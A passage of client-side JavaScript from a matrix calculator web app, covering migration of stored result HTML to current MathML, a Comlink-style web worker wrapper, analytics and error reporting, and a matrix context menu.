          span.parentNode.removeChild(span);
        }
      }
    };
    var removeCustomMath = function (e) {
      var elements = e.querySelectorAll('custom-math');
      for (var i = 0; i < elements.length; i += 1) {
        var x = elements[i];
        var math = document.createElement('math');
        math.innerHTML = x.innerHTML;
        x.parentNode.insertBefore(math, x);
        x.parentNode.removeChild(x);
      }
    };
    var removeMathClass = function (e) {
      var elements = e.querySelectorAll('.math');
      for (var i = 0; i < elements.length; i += 1) {
        var x = elements[i];
        if (x.firstChild === x.lastChild && x.firstElementChild != null && x.firstElementChild.tagName.toLowerCase() === 'math') {
          x.parentNode.insertBefore(x.firstChild, x);
          x.parentNode.removeChild(x);
        } else {
          while (x.firstChild != null) {
            x.parentNode.insertBefore(x.firstChild, x);
          }
          x.parentNode.removeChild(x);
        }
      }

      var es = e.querySelectorAll('span');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        while (x != null && x.tagName.toLowerCase() !== 'math') {
          x = x.parentNode;
        }
        if (x != null) {
          while (x.firstChild != null) {
            x.parentNode.insertBefore(x.firstChild, x);
          }
          x.parentNode.removeChild(x);
        }
      }

      // add <math></math>
      var visit = function (x) {
        if (x.nodeType === Node.ELEMENT_NODE && x.tagName.toLowerCase().slice(0, 1) === 'm') {
          if (x.tagName.toLowerCase() !== 'math') {
            if (x.previousSibling != null && x.previousSibling.nodeType === Node.ELEMENT_NODE && x.previousElementSibling.tagName.toLowerCase() === 'math') {
              x.previousElementSibling.appendChild(x);
            } else {
              var math = document.createElement('math');
              x.parentNode.insertBefore(math, x);
              x.parentNode.removeChild(x);
              math.appendChild(x);
            }
          }
        } else {
          var c = x.firstChild;
          while (c != null) {
            var next = c.nextSibling;
            visit(c);
            c = next;
          }
        }
      };
      visit(e);
    };
    var removeExtraMrows = function (e) {
      var es = e.querySelectorAll('mrow');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.firstChild === x.lastChild && x.firstChild != null && x.attributes.length === 0) {
          x.parentNode.insertBefore(x.firstChild, x);
          x.parentNode.removeChild(x);
        }
      }
    };
    var addRowspacing = function (e) {
      var es = e.querySelectorAll('mtable');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.getAttribute('rowspacing') == null) {
          x.setAttribute('rowspacing', '0ex');
        }
      }
    };
    var addMROWs = function (e) {
      var c = e.firstElementChild;
      while (c != undefined) {
        var next = c.nextElementSibling;
        if (c.tagName.toLowerCase() !== 'mrow') {
          hit({bc: "msub+msup"});//!
          var mrow = document.createElement("mrow");
          c.parentNode.insertBefore(mrow, c);
          c.parentNode.removeChild(c);
          mrow.appendChild(c);
        }
        c = next;
      }
    };
    var fixSummary = function (e) {
      var elements = e.querySelectorAll(".summary");
      for (var i = 0; i < elements.length; i += 1) {
        var oldSummary = elements[i];
        if (oldSummary != undefined && oldSummary.tagName.toLowerCase() !== "summary") { // backward compatibility
          hit({bc: ".summary"});//!
          var newSummary = document.createElement("summary");
          while (oldSummary.firstChild != undefined) {
            newSummary.appendChild(oldSummary.firstChild);
          }
          oldSummary.parentNode.insertBefore(newSummary, oldSummary);
          oldSummary.parentNode.removeChild(oldSummary);
        }
      }
    };
    var fixMSUBAndMSUP = function (node) {
      // MFENCED - ?
      if (" mfrac msqrt mroot msub msup munder ".indexOf(" " + node.tagName.toLowerCase() + " ") !== -1) {
        addMROWs(node);
      }
      var c = node.firstElementChild;
      while (c != undefined) {
        fixMSUBAndMSUP(c);
        c = c.nextElementSibling;
      }
    };
    var fixDetails = function (e) {
      var elements = e.querySelectorAll(".details");
      for (var i = 0; i < elements.length; i += 1) {
        var oldDetails = elements[i];
        hit({bc: ".details"});//!
        var container = document.createElement("div");
        container.classList.toggle("details-container", true);
        oldDetails.parentNode.insertBefore(container, oldDetails);
        oldDetails.parentNode.removeChild(oldDetails);
        oldDetails.classList.toggle("details", false);
        container.appendChild(oldDetails);
      }
    };
    var fixDetailsContainer = function (e) {
      var elements = e.querySelectorAll(".details-container");
      for (var i = 0; i < elements.length; i += 1) {
        var old = elements[i];
        var c = old.firstElementChild;
        if (c.classList.contains("details-container")) {
          hit({bc: ".details-container"});//!
          c.parentNode.removeChild(c);
          old.parentNode.insertBefore(c, old);
          old.parentNode.removeChild(old);
        }
      }
    };
    var fixOldDetailsTypes = function (e) {
      var elements = e.querySelectorAll("[data-details]");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var detailsAttribute = element.getAttribute("data-details");
        var x = JSON.parse(detailsAttribute);
        if (x instanceof Array) {
          hit({bc: 'detailsarray'});
          if (x.length !== 1) {
            throw new TypeError(x.length);//!
          }
          x = x[0];
        }
        var type = x.type;
        if (type === "determinant" || type === "inverse" || type === "rank") {
          hit({bc: "details-" + type});//!
          x.type = type + "-Gauss";
        }
        element.setAttribute("data-details", JSON.stringify(x));
        var idPrefix = element.getAttribute("data-id-prefix") || '';
        if (!/\-/.test(idPrefix)) {
          element.setAttribute("data-id-prefix", idPrefix + '-d' + i);
        }
      }
    };
    var fixMatrixContainer = function (e) { // <= 7
      var elements = e.querySelectorAll(".matrix-container");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var matrix = element.querySelector(".matrix-menu-show");
        element.removeAttribute('class');//!
        if (matrix != undefined) { // old version
          hit({bc: "matrix-container"});//!
          matrix = matrix.getAttribute("data-matrix") || element.getAttribute("data-matrix");
          if (matrix != undefined) { // Uncaught TypeError: Cannot read property 'replace' of null - https://matrixcalc.org/es/
            if (matrix.indexOf(";") !== -1 || matrix.indexOf("\t") !== -1) {
              matrix = "{{" + matrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
            }
            var columnlines = undefined;
            var useBraces = undefined;
            if (element.firstElementChild.tagName.toLowerCase() === 'mfenced') {
              columnlines = element.firstElementChild.firstElementChild.getAttribute("columnlines");
              if (columnlines != undefined) {
                columnlines = -1;//TODO:
              }
            }
            if (element.querySelector("[open=\"|\"]") != undefined) {
              useBraces = ["|", "|"];
            }
            if (element.querySelector("[open=\"{\"]") != undefined) {
              useBraces = ["{", " "];
            }
            var tmp = document.createElement("div");
            tmp.innerHTML = RPN.toMathML(matrix, {
              columnlines: columnlines,
              useBraces: useBraces
            });
            element.parentNode.insertBefore(tmp.firstElementChild, element);
            element.parentNode.removeChild(element);
          }
        }
      }
    };
    var fixTop = function (e) { // <= 7
      // <span class="top">-1</span>
      var elements = e.querySelectorAll(".top");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        if (element.innerHTML === "-1" || element.innerHTML === "T") {
          hit({bc: "top"});//!
          var base = element.previousElementSibling;
          var tmp = document.createElement("div");
          tmp.innerHTML = "<msup><mrow></mrow><mrow>" + RPN.toMathML(element.innerHTML, {}) + "</mrow></msup>";
          base.parentNode.removeChild(base);
          tmp.firstElementChild.firstElementChild.appendChild(base);
          element.parentNode.insertBefore(tmp.firstElementChild, element);
          element.parentNode.removeChild(element);
        }
      }
    };
    var fixDivMath = function (e) { // <= 7
      var x = e.firstElementChild;
      if (x != undefined && x.tagName.toLowerCase() === 'div' && x.classList.contains('math')) {
        //x.style.display = "inline-block";
        x.setAttribute("style", "display: inline-block;");
      }
    };
    var fixTable = function (e) {
      // <table class="inTable"></table>
      var elements = e.querySelectorAll(".inTable");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var span = element.nextElementSibling;
        var matrix = '';
        if (span != undefined && span.tagName.toLowerCase() === 'span' && span.style.display === 'none') {
          matrix = "{{" + span.innerHTML.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
          span.parentNode.removeChild(span);
        } else {
          var matrix = '';
          matrix += '{';
          var tbody = element.firstElementChild;
          for (var row = tbody.firstElementChild; row != null; row = row.nextElementSibling) {
            matrix += '{';
            for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
              if (cell.getAttribute('rowspan') == null) {
                var t = cell.querySelector('table');
                if (t != null) {
                  var x = t.firstElementChild.firstElementChild.textContent + '/' + t.firstElementChild.lastElementChild.textContent;
                  t.innerHTML = x;
                }
                matrix += cell.textContent;//TODO:
                matrix += cell.nextElementSibling != null && cell.nextElementSibling.getAttribute('rowspan') == null ? ',' : '';
              }
            }
            matrix += '}';
            matrix += row.nextElementSibling != null ? ',' : '';
          }
          matrix += '}';
        }
        if (matrix !== '') {
          hit({bc: "inTable"});//!
          var tmp = document.createElement("div");
          var isDeterminant = element.querySelector(".matrix-img-line") != undefined;
          tmp.innerHTML = RPN.toMathML(isDeterminant ? "determinant(" + matrix + ")" : matrix, {});
          element.parentNode.insertBefore(tmp.firstElementChild, element);
          element.parentNode.removeChild(element);
        }
      }
    };
    var fixArrowWithLabel = function (e) {
      var elements = e.querySelectorAll(".arrow-with-label");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        if (element.getAttribute("data-custom-paint") !== "arrow-with-label") {
          element.setAttribute("data-custom-paint", "arrow-with-label");
          hit({bc: "arrow-with-label"});
        }
      }
    };
    var fixMencloseInMenclose = function (e) {
      if (e.querySelector('math') == null) {//!
        var elements = e.querySelectorAll("menclose[notation=none]");
        for (var i = 0; i < elements.length; i += 1) {
          var element = elements[i];
          var mtable = element.querySelector("mtable");
          if (mtable != null && mtable.firstElementChild != null && mtable.firstElementChild === mtable.lastElementChild && mtable.firstElementChild.firstElementChild === mtable.firstElementChild.lastElementChild) {
            var e = mtable.querySelector("menclose[notation=none]");
            if (e != null && e.querySelector("mtable") != undefined && element.getAttribute('data-matrix') === '{{' + e.getAttribute('data-matrix') + '}}') {
              hit({bc: "menclose-menclose"});
              element.parentNode.insertBefore(e, element);
              element.parentNode.removeChild(element);
            }
          }
        }
      }
    };
    var replaceMfenced = function (e) {
      var es = e.querySelectorAll('mfenced');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        var open = e.getAttribute('open') || '(';
        var mo1 = document.createElement('mo');
        mo1.textContent = open;
        var close = e.getAttribute('close') || ')';
        var mo2 = document.createElement('mo');
        mo2.textContent = close;
        var t = document.createElement('mrow');
        t.appendChild(mo1);
        while (e.firstChild != null) {
          t.appendChild(e.firstChild);
        }
        t.appendChild(mo2);
        e.parentNode.insertBefore(t, e);
        e.parentNode.removeChild(e);
      }
    };
    var fixClassPivot = function (e) {
      var es = e.querySelectorAll('.pivot');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.tagName.toLowerCase() === 'mtd') {
          x.removeAttribute('class');
          var tmp = document.createElement('menclose');
          tmp.setAttribute('notation', 'circle');
          while (x.firstChild != null) {
            tmp.appendChild(x.firstChild);
          }
          x.appendChild(tmp);
        }
      }
    };
    var fixMoMo = function (html) {
      //TODO: counter
      return html.replace(/<mo>\+<mo>/g, "<mo>+</mo>");
    };
    var fixDiagonalizeSteps = function (html) {
      return html.replace(/diagonalize-steps/g, "steps-to-diagonalize");
    };
    var removeHref = function (tmp) {
      var es = tmp.querySelectorAll('[href="#"]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].removeAttribute('href');
      }
    };
    var removeMatrixMenuShowNew = function (tmp) {
      var es = tmp.querySelectorAll('.matrix-menu-show-new');
      for (var i = 0; i < es.length; i += 1) {
        es[i].classList.toggle('matrix-menu-show', true);
        es[i].classList.toggle('matrix-menu-show-new', false);
        if (es[i].textContent === '☰') {
          es[i].textContent = '';
        }
      }
    };
    var removeDataX = function (tmp) {
      var es = tmp.querySelectorAll('[data-x="TODO"]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].removeAttribute('data-x');
      }
    };
    var fixMunder = function (tmp) {
      var es = tmp.querySelectorAll('munder');
      for (var i = 0; i < es.length; i += 1) {
        es[i].setAttribute('accentunder', 'true');
      }
    };
    var fixRemoveSpanWrappers = function (tmp) {
      var es = tmp.querySelectorAll('math');
      for (var i = 0; i < es.length; i += 1) {
        var parentNode = es[i].parentNode;
        if (parentNode.tagName.toLowerCase() === 'span') {
          if (parentNode.getAttributeNames().join('') === 'class' && parentNode.childElementCount === 1) {
            var classList = parentNode.getAttribute('class');
            if (classList.replace(/(?:^|\s)no\-\S+|math/g, '').trim() === '') {
              parentNode.parentNode.insertBefore(es[i], parentNode);
              parentNode.parentNode.removeChild(parentNode);
            }
          }
        }
      }
    };
    var fixQuestionIcon = function (tmp) {
      var es = tmp.querySelectorAll('.relative');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i].firstElementChild;
        if (x != null && x.tagName.toLowerCase() === 'math') {
          var y = x.nextElementSibling;
          if (y != null && (y.tagName.toLowerCase() === 'a' && y.classList.contains('question-icon') || y.tagName.toLowerCase() === 'span')) {
            var math = document.createElement('math');
            math.innerHTML = '<mpadded><mover accent="true">' + x.innerHTML + '<mtext></mtext></mover></mpadded>';
            var mtext = math.querySelector('mtext');
            while (x.nextElementSibling != null) {
              mtext.appendChild(x.nextElementSibling);
            }
            var qi = math.querySelector('.question-icon');
            if (qi != null) {
              qi.classList.toggle('question-icon', false);
              qi.classList.toggle('question-icon-new', true);
            }
            es[i].parentNode.insertBefore(math, es[i]);
            es[i].parentNode.removeChild(es[i]);
          }
        }
      }
    };
    var fixMencloseDraggable = function (tmp) {
      var es = tmp.querySelectorAll('menclose[draggable]');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        if (e.getAttribute('notation') === 'none') {
          var mrow = document.createElement('mrow');
          while (e.firstElementChild != null) {
            mrow.appendChild(e.firstElementChild);
          }
          var attributeNames = e.getAttributeNames();
          for (var j = 0; j < attributeNames.length; j += 1) {
            var a = attributeNames[j];
            mrow.setAttribute(a, e.getAttribute(a));
          }
          mrow.removeAttribute('notation');
          es[i].parentNode.insertBefore(mrow, e);
          es[i].parentNode.removeChild(e);
        }
      }
    };
    var fixMstyle = function (tmp) {
      var es = tmp.querySelectorAll('mstyle[mathvariant=bold]');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        var mrow = document.createElement('mrow');
        mrow.style.fontWeight = 'bold';
        while (e.firstElementChild != null) {
          mrow.appendChild(e.firstElementChild);
        }
        e.parentNode.insertBefore(mrow, e);
        e.parentNode.removeChild(e);
      }
    };
    var fixHTML = function (html) {
      if (html == undefined) {
        return html;
      }
      var tmp = document.createElement("div");
      html = fixMoMo(html);
      if (oldVersion <= 15) {
      html = fixDiagonalizeSteps(html);
      }
      tmp.innerHTML = html;
      try {
        fixOldDetailsTypes(tmp);
        if (oldVersion <= 15) {
          removeInsertButtons(tmp);
          fixMSUBAndMSUP(tmp);
          fixSummary(tmp);
          fixDetails(tmp);
          fixDetailsContainer(tmp);
          fixMatrixContainer(tmp);
          fixTable(tmp); // it should be before fixTop
          fixTop(tmp);
          fixDivMath(tmp);
          fixArrowWithLabel(tmp);
          fixMencloseInMenclose(tmp);
          removeCustomMath(tmp);
          removeMathClass(tmp);
          removeExtraMrows(tmp);
          addRowspacing(tmp);
          replaceMfenced(tmp);
          fixClassPivot(tmp);
        }
        if (oldVersion <= 16) {
          removeHref(tmp);
          removeMatrixMenuShowNew(tmp);
          removeDataX(tmp);
        }
        if (oldVersion <= 19) {
          fixMunder(tmp);
          fixRemoveSpanWrappers(tmp);
          fixQuestionIcon(tmp);
          if (tmp.querySelector('.question-icon') != null || tmp.querySelector('.relative') != null) {
            throw new TypeError('an issue with an update');
          }
        }
        if (oldVersion <= 20) {
          fixMencloseDraggable(tmp);
        }
        fixMstyle(tmp);
      } catch (error) {
        //TODO: fix
        console.error(error);
        window.setTimeout(function () {
          throw new TypeError("fixHTML(" + error.toString() + "): " + html);
        }, 0);
      }
      return tmp.innerHTML;
    };
    //if (data.expressionString != undefined && data.expressionString !== "") {
    //  RPNProxy.runExpression(data.expressionString, undefined, undefined, undefined, {idPrefix: "i" + data.actHistoryId}).then(function (result) {
    //    if (result.resultError == undefined) {
    //      data.resultHTML = result.resultHTML;
    //      data.detailsHTML = result.detailsHTML;
    //    }
    //  });
    //} else {
      data.resultHTML = fixHTML(data.resultHTML);
      data.detailsHTML = fixHTML(data.detailsHTML);
    //}
    if (data.detailsHTML == undefined) {
      var details = data.details;
      // details === null after JSON.parse(JSON.stringify(details))
      if (details != undefined && details.length !== 0) {
        hit({bc: "createDetailsSummary"});
        //TODO: async
        data.detailsHTML = RPN.createDetailsSummary("i" + data.actHistoryId, details, details.length === 1 ? 100 : 1);
      }
    }
  }
  return data;
};

globalThis.ItemsStorage = ItemsStorage;

}());
/*jslint plusplus: true, vars: true, indent: 2, white: true, esversion:6 */
/*global window, document, console, Node, Image, Element, Event, Dialog, Ya, PageUtils, reportValidity, fetch, initializeAInput, initializeAHighlight, initializeATooltip, MathMLToSVG, ItemsStorage, IDBItemsStorage, RPNProxy, i18n, serializeMatrixContainer, toMultilineString, getTableFromAsciiMathMatrix, ActHistoryStorage, parseMathML, YT*/

(function () {
"use strict";

function Comlink() { // see comlink on npm
}
Comlink.wrap = function (worker) {
  return new Promise(function (resolve, reject) {
    var idCounter = 0;
    var callbacksById = {};
    worker.onmessage = function (event) {
      var data = event.data;

      var id = data.id;
      var result = data.result;
      var error = data.error;

      if (id === -1) {
        var makeFunction = function (name) {
          return function () {
            var args = Array.from(arguments);
            return new Promise(function (resolve, reject) {
              var id = (idCounter += 1);
              callbacksById[id] = {
                callback: resolve,
                errorCallback: reject
              };
              worker.postMessage({id: id, name: name, args: args});
            });
          };
        };
        var apiObj = {};
        var api = data.result;
        for (var i = 0; i < api.length; i += 1) {
          var name = api[i];
          apiObj[name] = makeFunction(name);
        }
        resolve(apiObj);
        return;
      }

      var callbacks = callbacksById[id];
      delete callbacksById[id];
      if (error != undefined) {
        callbacks.errorCallback(error);
      } else {
        callbacks.callback(result);
      }
    };
    worker.postMessage({id: -1, name: '', args: []});

  });
};

function createWorker() {
  var src = (document.documentElement.getAttribute('data-root-path') || '/') + 'compiled.expression.js' + document.documentElement.getAttribute("data-version-tag");
  var worker = window.expressionWorker;
  if (worker == null) {
    if (window.Worker != undefined && typeof BigInt !== "undefined") {
      try {
        worker = new window.Worker(src);
      } catch (error) {
        // Chrome for file: protocol
        console.log(error);
      }
    }
  }
  if (worker != undefined) {
    Comlink.wrap(worker).then(function (api) {
      Utils.waitI18n(function () {
        globalThis.RPNProxy = api;
        globalThis.RPNProxy.setI18n(i18n);
        document.dispatchEvent(new Event('worker-ready'));
      });
    });
  } else {
    var script = document.createElement('script');
    script.id = 'script-expression';
    script.onload = function () {
      var x = {};
      var wrap = function (f) {
        return function () {
          return Promise.resolve(f.apply(null, arguments));
        };
      };
      for (var key in RPN) {
        if (Object.prototype.hasOwnProperty.call(RPN, key)) {
          x[key] = wrap(RPN[key]);
        }
      }
      globalThis.RPNProxy = x;
    };
    script.src = src;
    (document.head || document.documentElement).appendChild(script);
    //TODO: script.onerror = ... - ?
  }
};

createWorker();

function waitScript(testFunction, id, callback) {
  function f(e) {
    var that = this;
    if (testFunction()) {
      callback.call(this, e);
    } else {
      //TODO:!?
      var script = document.getElementById(id) || document.createElement('script');
      var listener = function () {
        window.clearTimeout(timeoutId);
        script.removeEventListener('load', listener, false);
        document.removeEventListener('worker-ready', listener, false);
        f.call(that, e);
      };
      var timeoutId = window.setTimeout(listener, 1000);
      script.addEventListener('load', listener, false);
      document.addEventListener('worker-ready', listener, false);
    }
  }
  return f;
}

//TODO: REMOVE
function waitExpression(callback) {
  return waitScript(function () {
    return globalThis.Expression != null || globalThis.RPNProxy != null;
  }, 'script-expression', callback);
}
globalThis.waitExpression = waitExpression;

var hasNativeTextDetector = typeof TextDetector !== 'undefined';


var supportsChUnits = globalThis.CSS != null && typeof globalThis.CSS.supports === 'function' && CSS.supports('(width: 1ch)');

function ch(value) {
  return supportsChUnits ? value : (0.55 * Number.parseFloat(value)) + "em";
}


document.addEventListener('click', function (event) {
  // the event target is a Document somehow, and so event.target.tagName is null
  if (event.target.matches('a[href*="//"]')) {
    event.target.setAttribute('rel', 'noopener');
  }
});

// TODO: implement Dialog.prompt, replace button+input with button+Dialog.prompt



var addClickOnEnter = function (element) {
  var input = element.querySelector('input');
  var button = element.querySelector('button');
  input.enterKeyHint = 'go'; //?  it should produce keydown events - https://groups.google.com/a/chromium.org/d/msg/blink-dev/Hfe5xktjSV8/KItGmnG_BAAJ
  input.addEventListener('keydown', function (event) {
    var DOM_VK_RETURN = 13;
    if (event.keyCode === DOM_VK_RETURN && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault(); // in case of moving focus to some other element (textarea)
      button.click();
    }
  }, false);
};

var Utils = PageUtils;

Utils.initialize(".button-before-input", function (element) {
  addClickOnEnter(element);
});

  // ...

//TODO: remove "window."
var yaCounter = undefined;
globalThis.hitQueue = [];
var sendHits = function () {
  yaCounter.params(hitQueue);
  globalThis.hitQueue = [];
};
var roundValue = function (value, max) {
  return "10**" + (Math.floor(Math.log2(Math.max(value, max) + 0.5) / Math.log2(10)) + 1);
};
var hit = function (params) {
  if (globalThis.hitQueue != undefined) {
    globalThis.hitQueue.push(params);
    if (yaCounter != undefined) {
      requestIdleCallback("sendHits", sendHits, 1000);
    }
  }
};
globalThis.hit = hit;//! see Polynomial#getroots

  var postError = function (error, input, initialInput, classList) {
    input = input || undefined;
    initialInput = initialInput || undefined;
    classList = classList || undefined;
    var e = function (element) {
      if (element == undefined) {
        return undefined;
      }
      var a = element.getAttribute("data-expression");
      return (element.classList || "").toString() + (a == undefined ? "" : "[data-expression=" + a + "]");
    };
    var object = {
      error: error.name + ": " + error.message,
      input: input,
      initialInput: initialInput,
      classList: classList,
      focusedElement: e(document.querySelector(":focus")),
      rounding: decimalRounding
    };
    var tables = document.querySelectorAll(".matrix-table");
    for (var i = 0; i < tables.length; i += 1) {
      var id = tables[i].getAttribute("data-id");
      var table = MatrixTables[id];
      if (table != undefined) {
        var x = table.getRawInput(table.mode);
        var value = "";
        if (typeof x !== "string") {
          var y = "";
          y += "{";
          for (var j = 0; j < x.length; j += 1) {
            y += j !== 0 ? "," : "";
            y += "{" + x[j].join(",") + "}";
          }
          y += "}";
          value = y;
        } else {
          value = x;
        }
        object[id] = value;
      }
    }
    var inputs = document.querySelectorAll("input");
    for (var k = 0; k < inputs.length; k += 1) {
      var name = inputs[k].name;
      if (name != undefined && (name.slice(0, 2) === "k-" || name === "expression")) {
        object[name] = inputs[k].value;
      }
    }
    var s = JSON.stringify(object);
    window.onerror(s, error.fileName || "", error.lineNumber || 0, error.columnNumber || 0, error);
  };

  globalThis.postError = postError;

    var handleError = function (initialInput, classList, e, positionInfo) {
      //TODO: check
      var message = e.message;
      var i = message.indexOf(":");
      var errorName = i === -1 ? message : message.slice(0, i);
      var errorDetail = i === -1 ? "" : message.slice(i + 1);

      if (errorName === "ArithmeticException") {
        Dialog.alert(getInputErrorHTML(positionInfo, i18n.errors.divisionByZeroError));//?
      } else if (errorName === "IntegerInputError") {
        var inputElementId = errorDetail;
        var inputElement = document.getElementById(inputElementId);
        reportValidity(inputElement, i18n.errors.pleaseFillOutThisField);//TODO: ?
      } else if (errorName === "NotSupportedError") {
        var text = i18n.errors.operationIsNotSupported;
        if (errorDetail === "matrixArgExpected") {
          text += "\n" + i18n.errors.matrixArgExpected;
        }
        Dialog.alert(getInputErrorHTML(positionInfo, text));//?
        postError(e, positionInfo.input, initialInput, classList);
      } else if (errorName === "UserError") {
        Dialog.alert(getInputErrorHTML(positionInfo, getInputError(e)));//?
        postError(e, positionInfo.input, initialInput, classList);
      } else if (errorName === "SingularMatrixException") {
        Dialog.alert(i18n.inverse.determinantIsEqualToZeroTheMatrixIsSingularNotInvertible);
      } else if (errorName === "MatrixDimensionMismatchException") {
        Dialog.alert(i18n.errors.matricesShouldHaveSameDimensions);
      } else if (errorName === "NonSquareMatrixException") {
        var text = errorDetail !== "" ? errorDetail : i18n.errors.matrixIsNotSquare;
        Dialog.alert(text);
      //} else if (errorName === "NonRealMatrixException") {//TODO: remove - ?
      //  Dialog.alert(i18n.CholeskyDecomposition.matrixIsNotReal);
      //} else if (errorName === "NonComplexMatrixException") {//TODO: remove - ?
      //  Dialog.alert(i18n.CholeskyDecomposition.matrixIsNotComplex);
      } else if (errorName === "NonSymmetricMatrixException") {
        Dialog.alert('<math><mi>A</mi><mo>&ne;</mo><msup><mi>A</mi><mi>T</mi></msup></math>' + " — " + i18n.CholeskyDecomposition.theMatrixIsNotSymmetric);
      } else if (errorName === "NonHermitianMatrixException") {
        Dialog.alert('<math><mi>A</mi><mo>&ne;</mo><mover accent="true"><msup><mi>A</mi><mi>T</mi></msup><mo>¯</mo></mover></math>' + " — " + i18n.CholeskyDecomposition.theMatrixIsNotHermitian);
      } else if (errorName === "DimensionMismatchException") {
        Dialog.alert(i18n.errors.theNumberOfColumnsInFirstMatrixShouldEqualTheNumberOfRowsInSecond);
      } else if (errorName === "ValueMissingError") {
        hit({error: message});//?
        var inputElementId = errorDetail;
        var inputElement = document.getElementById(inputElementId);
        reportValidity(inputElement, i18n.errors.pleaseFillOutThisField);
      } else {
        Dialog.alert(getInputErrorHTML(positionInfo, getInputError(null)));//?
        postError(e, positionInfo.input, initialInput, classList);
        window.sendSnapshot();
        //throw new TypeError(message);
        console.log(e);
      }
    };

//!
var decimalRounding = null;

/* #matrix-menu-dialog */

var getMatrixMenuShow = function (matrixContainer) {
  return matrixContainer.parentNode.querySelector(".matrix-menu-show") || matrixContainer.parentNode.parentNode.querySelector(".matrix-menu-show");
};

var showDialog = function (matrixMenu, content) {
  //!
  // as MathML elements are not focusable, move the focus to the button (Firefox + contextmenu)
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  if (document.activeElement === matrixContainer && document.activeElement.focus == null) {
    var focusNode = getMatrixMenuShow(matrixContainer);
    focusNode.focus();
  }
  if (document.activeElement.classList.contains("menuitem")) {
    var focusNode = getMatrixMenuShow(matrixContainer);
    focusNode.focus();
  }
  //!
  var dialog = Dialog.standard(content, "<button autofocus=\"autofocus\" type=\"submit\">" + i18n.misc.close + "</button>");
  dialog.setAttribute("dir", "ltr");
  var input = dialog.querySelector("input") || dialog.querySelector("textarea") || dialog.querySelector("img");
  if (input.tagName.toLowerCase() !== 'img') {
    input.select();
  }
  input.focus();
};

var onShowAsMenuitemClick = function (event) {
  var menuitem = event.target;
  hit({click: menuitem.id});
  var matrixMenu = menuitem.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute('data-for-matrix'));
  var content = null;
  if (menuitem.id === 'show-mathml-menuitem') {
    var value = serializeMatrixContainer(matrixContainer);
    content = '<textarea class="show-textarea" wrap="off">' + Utils.escapeHTML(value) + '</textarea>';
  } else if (menuitem.id === 'show-text-menuitem') {
    var value = matrixContainer.getAttribute('data-matrix');
    content = '<input type="text" value="${value}" />'.replace(/\$\{value\}/g, Utils.escapeHTML(value));
  } else if (menuitem.id === "show-image-menuitem") {
    var image = MathMLToSVG.drawMathMLElement(matrixContainer);
    content = '<img width="${image.width}" height="${image.height}" src="${image.src}" tabindex="0" />'
                .replace(/\$\{image\.width\}/g, image.width)
                .replace(/\$\{image\.height\}/g, image.height)
                .replace(/\$\{image\.src\}/g, image.src);
  } else if (menuitem.id === "show-latex-menuitem") {
    var value = mathmlToLaTeX(matrixContainer);
    content = '<textarea class="show-textarea" wrap="off">' + Utils.escapeHTML(value) + '</textarea>';
  }
  showDialog(matrixMenu, content, event);
};




//!
//TODO: (!) Firefox 75(?) uses "global" undo/redo stack for contenteditable=true !
//!

var insertText = function (text, input) {
  if (document.queryCommandEnabled("insertText")) {
    document.execCommand("insertText", false, text);// "undo" support
    // Note: "insertText" does not fire any events in Chrome, when the text is empty and the field is empty
  } else {
    // Firefox with <input> or <textarea>, see https://bugzilla.mozilla.org/show_bug.cgi?id=1220696
    // Mobile Safari somehow (?)
    //var input = document.activeElement; - on Mobile Safari the document.activeElement is the <body> when it should be a <textarea>
    var selectionStart = input.selectionStart;
    var selectionEnd = input.selectionEnd;
    input.setRangeText(text);
    input.setSelectionRange(selectionStart + text.length, selectionStart + text.length);
    if (text !== "" || selectionStart !== selectionEnd) { // to match Chrome's behaviour
      input.dispatchEvent(new Event('input'));
    }
  }
};


var prepareMatrixMenu = function (dataForMatrix) {
  var matrixMenu = document.getElementById("matrix-menu");
  if (matrixMenu == undefined) {
    var addMenuItem = function (id, label, onClick) {
      var node = document.createElement("menuitem");
      node.id = id;
      node.setAttribute("label", label);
      node.onclick = onClick;
      matrixMenu.appendChild(node);
    };
    matrixMenu = document.createElement('menu');
    matrixMenu.id = 'matrix-menu';
    matrixMenu.setAttribute('type', 'context');
    var tables = document.querySelectorAll(".matrix-table");
    for (var i = 0; i < tables.length; i += 1) {
      var id = tables[i].getAttribute("data-id");
      addMenuItem('print-matrix-menuitem-' + id, i18n.buttons.insertIn + ' ' + id, onPrintMatrix);
    }
    if (document.querySelector(".add-table") != null) { // not on slu.html
      var nextId = getNextTableId();
      addMenuItem('print-matrix-menuitem-' + nextId, i18n.buttons.insertInNewTable || (i18n.buttons.insertIn + ' ' + nextId), onPrintMatrixIntoNewTable);
    }
    // `document.queryCommandEnabled("copy")` returns false in Edge 17 when the selection is "collapsed"
    // `document.queryCommandEnabled("copy")` returns false, but "copy" works in Opera 12 (if allow js clipboard access)
    if (document.queryCommandSupported("copy")) {
      addMenuItem('copy-matrix-to-clipboard-menuitem', i18n.matrixMenu.copyToClipboard, onCopyMatrixToClipboard);
    }
    addMenuItem('show-mathml-menuitem', i18n.matrixMenu.showMathML, onShowAsMenuitemClick);
    addMenuItem('show-text-menuitem', i18n.matrixMenu.showText, onShowAsMenuitemClick);
    addMenuItem('show-image-menuitem', i18n.matrixMenu.showImage, onShowAsMenuitemClick);
